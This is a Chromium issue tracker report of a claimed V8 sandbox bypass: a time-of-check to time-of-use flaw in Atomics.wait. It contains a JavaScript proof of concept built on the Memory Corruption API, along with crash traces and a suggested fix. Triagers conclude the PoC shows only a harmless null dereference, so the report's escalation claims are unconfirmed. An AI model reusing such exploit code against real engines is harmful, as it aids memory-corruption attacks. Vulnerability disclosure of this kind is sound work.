# V8 Sandbox Bypass: Atomics TypedArray TOCTOU (Map/Length Mismatch)

| Field | Value |
|-------|-------|
| **Issue ID** | [495046320](https://issues.chromium.org/issues/495046320) |
| **Status** | Verified |
| **Severity** | S4-Minimal |
| **Priority** | P2 |
| **Component** | Blink>JavaScript |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ki...@gmail.com |
| **Assignee** | ma...@chromium.org |
| **Created** | 2026-03-22 |
| **Bounty** | $5,000.00 |

## Description

---

### Report description

TOCTOU Type Confusion in Atomics.wait via ElementsKind Switcheroo (Bypass of [Issue 488927521](https://issues.chromium.org/issues/488927521))

---

### Bug location

#### Where do you want to report your vulnerability?

Chrome VRP – Report security issues affecting the Chrome browser. [See program rules](https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules)

#### Which URL (or repository) have you found the vulnerability in?

<https://chromium.googlesource.com/v8/v8.git>

---

### The problem

#### Please describe the technical details of the vulnerability

## Component Name

V8 (`src/builtins/builtins-sharedarraybuffer.cc`)

## Affected Versions

V8 version 14.8.0 (candidate) - Tested on Revision 105944. Valid for currently shipping stable versions.

## Summary

A Time-of-Check to Time-of-Use (TOCTOU) vulnerability exists in the C++ built-in implementation of `Atomics.wait` (`v8::internal::DoWait`). This is a bypass of the previous "ElementsKind switcheroo" fix (commit 149c19d), which addressed the vulnerability in CSA built-ins but missed the C++ implementation. By supplying an object with a customized `valueOf` method as the `value` parameter, an attacker can synchronously flip the `ElementsKind` of a TypedArray during the wait state conversion, causing a severe Type Confusion when V8 resumes its execution.

## Broken vs. Expected Behavior

**Expected Behavior:** The `Atomics.wait` function should safely handle type conversions by "pinning" the `ElementsKind` at the start of the operation and reusing that pinned value, or by re-validating the underlying array map after any side-effecting operations like `ToInt32` or `ToBigInt`.

**Broken Behavior:** `Atomics.wait` checks the array's `ElementsKind` prior to type conversion. During type conversion (`ToInt32`/`ToBigInt`), arbitrary JavaScript (`valueOf`) is executed, allowing the attacker to corrupt the `TypedArray`'s Map using a memory corruption primitive (like the Sandbox Memory Corruption API). After the conversion, `Wait` re-reads the (now corrupted) `ElementsKind` and assumes the pre-calculated `value` matches the new type, converting numbers into unconstrained pointers (e.g., casting `Smi` to `BigInt` objects).

## Vulnerability Details & Source Code Analysis

The vulnerability is rooted in `v8::internal::DoWait` located in `src/builtins/builtins-sharedarraybuffer.cc`.

1. **Initial Type Check:** At **line 202**, the engine checks `sta->type()` to determine how to cast the incoming `value` object.
   ```
   // Line 202
   if (sta->type() == kExternalBigInt64Array) {
       ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, value, BigInt::FromObject(isolate, value));
   } else {
       DCHECK(sta->type() == kExternalInt32Array);
       // Line 208
       ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, value, Object::ToInt32(isolate, value));
   }
   
   ```
2. **Synchronous JS Execution (The Window):** At **line 208**, `Object::ToInt32` evaluates the target object, which synchronously invokes the attacker's `valueOf()` JavaScript function. In this execution window, the attacker leverages Sandbox primitives to mutate the memory of the `JSTypedArray`, changing its Map/`ElementsKind` from `Int32Array` to `BigInt64Array`. The JS function then returns a standard `Number` (a `Smi`).
3. **Secondary Type Check (The Confusion):** At **line 241**, the engine re-reads the underlying `ElementsKind`.
   ```
   // Line 241
   if (sta->type() == kExternalBigInt64Array) {
     return FutexEmulation::WaitJs64(
         isolate, mode, array_buffer, GetAddress64(i, sta->byte_offset()),
         Cast<BigInt>(value)->AsInt64(), timeout_number); // Line 244
   }
   
   ```
4. **The Crash:** Because the Map was flipped to `BigInt64Array` during Step 2, the engine enters the `if` block at line 241. At **line 244**, it attempts to `Cast<BigInt>(value)`. However, `value` is still the `Smi` primitive returned by our `valueOf` function in Step 2. Casting a `Smi` (e.g., `0`) to a `BigInt` pointer causes a Null Pointer Dereference when `->AsInt64()` is invoked.

## Reproduction Steps

This bug was reliably reproduced on Linux using WSL (Ubuntu 22.04) and a pre-compiled V8 AddressSanitizer (ASan) binary.

**Step 1: Download the Sandbox-Testing ASan Binary**
Download the specific continuous release binary that enables the Memory Corruption API:

```
wget "https://www.googleapis.com/download/storage/v1/b/v8-asan/o/linux-release%2Fd8-asan-sandbox-testing-linux-release-v8-component-105944.zip?generation=1774111917089836&alt=media" -O d8.zip
unzip d8.zip -d d8-asan-sandbox
chmod +x d8-asan-sandbox/d8

```

**Step 2: Save the PoC (`poc.js`)**
Save the following code to `poc.js`:

```
const SAB = new SharedArrayBuffer(1024);
const i32 = new Int32Array(SAB);
const b64 = new BigInt64Array(SAB);

// 1. Manually obtain the map pointers of the target arrays
const i32_addr = Sandbox.getAddressOf(i32);
const i32_view = new Sandbox.MemoryView(i32_addr, 8);
const i32_dv = new DataView(i32_view);
const i32_map = i32_dv.getUint32(0, true);

const b64_addr = Sandbox.getAddressOf(b64);
const b64_view = new Sandbox.MemoryView(b64_addr, 8);
const b64_dv = new DataView(b64_view);
const b64_map = b64_dv.getUint32(0, true);

const victim = new Int32Array(SAB);

// 2. Define the side-effect trigger (invoked deeply inside Atomics.wait ToInt32)
const trigger = {
  valueOf: function() {
    print('trigger.valueOf() called - rotating map...');
    // Synchronously flip victim's Map to BigInt64Array during ToInt32!
    Sandbox.corruptObjectField(victim, 0, b64_map);
    return 0; // Return a normal Number (Smi)
  }
};

print('Calling Atomics.wait to trigger type confusion...');
try {
  // 3. Trigger the type confusion
  // Atomics.wait begins under the assumption `victim` is an Int32Array. 
  // It evaluates `trigger` -> calls valueOf(), which flips `victim` to BigInt64Array. 
  // Execution resumes and attempts to cast the primitive `0` as a BigInt pointer.
  Atomics.wait(victim, 0, trigger, 1);
} catch(e) {}

```

**Step 3: Execute to Trigger Crash**
Run the PoC using the downloaded binary. *Note: We intentionally omit `--sandbox-testing` here and use `--expose-memory-corruption-api` directly to bypass the sandbox crash interceptor and yield a pristine ASan trace.*

```
./d8-asan-sandbox/d8 --expose-memory-corruption-api --allow-natives-syntax poc.js

```
## Crash Information / ASan Stack Trace

When executing the PoC on ASan, `d8` crashes with a segmentation fault (`SEGV_MAPERR`) originating in `v8::internal::BigInt::AsInt64()`.

```
Received signal 11 SEGV_MAPERR 000000000003

==== C stack trace ===============================

./d8(___interceptor_backtrace+0x46)[0x648a76d419f6]
./d8(_ZN2v84base5debug10StackTraceC1Ev+0x34)[0x648a7c41ac44]
./d8(+0x7b81a30)[0x648a7c41aa30]
/lib/x86_64-linux-gnu/libc.so.6(+0x42520)[0x7fecb0442520]
./d8(_ZN2v88internal6BigInt7AsInt64EPb+0x3f)[0x648a77e4ab7f]
./d8(_ZN2v88internal6DoWaitEPNS0_7IsolateENS0_14FutexEmulation8WaitModeENS0_6HandleINS0_6ObjectEEES7_S7_S7_+0x5db)[0x648a7730bd3b]
./d8(+0x2a73822)[0x648a7730c822]
./d8(+0x7993f76)[0x648a7c22cf76]
[end of stack trace]

```

The crash at `000000000003` occurs because `DoWait()` casts the returned `Smi` `0` to a `BigInt*`. When ASan checks the memory access for `AsInt64()`, it fails.

## Attack Scenario / Impact

An attacker with an existing initial read/write within the V8 Sandbox can use this vulnerability to escalate their privileges. By type-confusing an attacker-controlled primitive (returned by `valueOf`) into a `BigInt` structure pointer inside C++ Space, the engine can be forced to interpret raw integers as memory addresses. This can manipulate out-of-line storage accesses, facilitating targeted Out-Of-Bounds (OOB) memory corruption inside or outside the guarded heap boundary. This essentially restores the attack surface intended to be resolved by the prior mitigations in [issue 488927521](https://issues.chromium.org/issues/488927521).

## Suggested Fix

The root cause is identically aligned with the previous flaw in the CSA builtins: reloading the `ElementsKind` after side-effects execute.
To patch this, `DoWait` (and any related functions like `DoNotify`) must "pin" the `ElementsKind` locally at the start of the function and exclusively use that local cache for all subsequent conditionals.

```
// Cache the type immediately
ElementsKind kind = sta->type();

// ... Use 'kind' for casting value ...
if (kind == kExternalBigInt64Array) { /* FromObject */ } else { /* ToInt32 */ }

// ... Timeout evaluation ...

// Use 'kind' AGAIN for final execution, NEVER calling `sta->type()`
if (kind == kExternalBigInt64Array) {
    return FutexEmulation::WaitJs64(...);
} else {
    return FutexEmulation::WaitJs32(...);
}

```
#### Impact analysis

OOM

---

### The cause

#### What version of Chrome have you found the security issue in?

148.0.0.0 Canary/Dev (Identified on V8 branch main, Revision 105944, V8 version 14.8.0. The vulnerable v8::internal::DoWait C++ code path has been present long-term, so this bypass fundamentally affects Stable and Beta channels as well).

#### Is the security issue related to a crash?

No, it is not related to a crash.

#### Choose the type of vulnerability

Other

#### How would you like to be publicly acknowledged for your report?

Venkatesan Perumal(VenkatKWest)

## Timeline

### el...@google.com (2026-03-23)

Securitys hepherd: thanks for the report; this reproduces for me with v8 264e8380ec49f2184c964bfb142e27efdd347ed9 and these build args:

```
is_asan=true
symbol_level=2
v8_optimized_debug=false
target_cpu="x64"
v8_target_cpu="x64"
v8_enable_sandbox=true
v8_enable_pointer_compression=true
v8_enable_memory_corruption_api=true
is_component_build=true
use_remoteexec=true
use_siso=true
use_sysroot=true

```

That produces this DCHECK failure:

```
$ /Users/ellyjones/p/v8/v8/out/rel/d8 --expose-memory-corruption-api poc.js
d8(15527,0x202c8ce40) malloc: nano zone abandoned due to inability to reserve vm space.
Calling Atomics.wait to trigger type confusion...
trigger.valueOf() called - rotating map...


#
# Fatal error in ../../src/builtins/builtins-sharedarraybuffer.cc, line 244
# Debug check failed: Holder<To> v8::internal::TrustedCast(Holder<From>, SourceLocation) [To = v8::internal::BigInt, From = v8::internal::Object, Holder = v8::internal::Handle].
#
#
#
#FailureMessage Object: 0x112b7dc60
==== C stack trace ===============================

    0   libv8_libbase.dylib                 0x000000010b8a0658 v8::base::debug::StackTrace::StackTrace() + 88
    1   libv8_libbase.dylib                 0x000000010b8a06c5 v8::base::debug::StackTrace::StackTrace() + 21
    2   libv8_libplatform.dylib             0x000000010baf67df v8::platform::(anonymous namespace)::PrintStackTrace() + 383
    3   libv8_libbase.dylib                 0x000000010b83b164 v8::base::PrintStackTraceIfAvailable() + 20
    4   libv8_libbase.dylib                 0x000000010b83bfe5 V8_Fatal(char const*, int, char const*, ...) + 725
    5   libv8_libbase.dylib                 0x000000010b83b1f7 v8::base::(anonymous namespace)::DefaultDcheckHandler(char const*, int, char const*) + 71
    6   libv8_libbase.dylib                 0x000000010b83c18d V8_Dcheck(char const*, int, char const*) + 77
    7   libv8.dylib                         0x000000012fa12d12 T1<T> v8::internal::TrustedCast<v8::internal::BigInt, v8::internal::Object, v8::internal::Handle>(T1<T0>, v8::SourceLocation) + 338
    8   libv8.dylib                         0x000000012fa1275f T1<T> v8::internal::Cast<v8::internal::BigInt, v8::internal::Object, v8::internal::Handle>(T1<T0>, v8::SourceLocation) + 79
    9   libv8.dylib                         0x000000012fb83505 v8::internal::DoWait(v8::internal::Isolate*, v8::internal::FutexEmulation::WaitMode, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>) + 4965
    10  libv8.dylib                         0x000000012fb845e1 v8::internal::Builtin_Impl_AtomicsWait(v8::internal::BuiltinArguments, v8::internal::Isolate*) + 513
    11  libv8.dylib                         0x000000012fb83f15 v8::internal::Builtin_AtomicsWait(int, unsigned long*, v8::internal::Isolate*) + 565
    12  libv8.dylib                         0x000000012e9a6b3d Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit + 61
    13  libv8.dylib                         0x000000012e40ae14 Builtins_InterpreterEntryTrampoline + 340
    14  libv8.dylib                         0x000000012e3fd567 Builtins_JSEntryTrampoline + 103
Trace/BPT trap

```

### ch...@google.com (2026-03-24)

Setting milestone because of s0/s1 severity.

### ar...@google.com (2026-03-24)

Thanks for the report. I cannot reproduce the bypass:

```
./out/asan/d8 --sandbox-testing poc.js
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
Sandbox bounds: [0x7a8000000000,0x7b8000000000)
Calling Atomics.wait to trigger type confusion...
trigger.valueOf() called - rotating map...
Caught harmless memory access violation (nullptr dereference). Exiting process...

```

The PoC shows a nullptr de-reference which is not a bypass, the PoC should show an out-of-sandbox write primitive that prints "V8 sandbox violation detected".

### ch...@google.com (2026-07-01)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/495046320)*
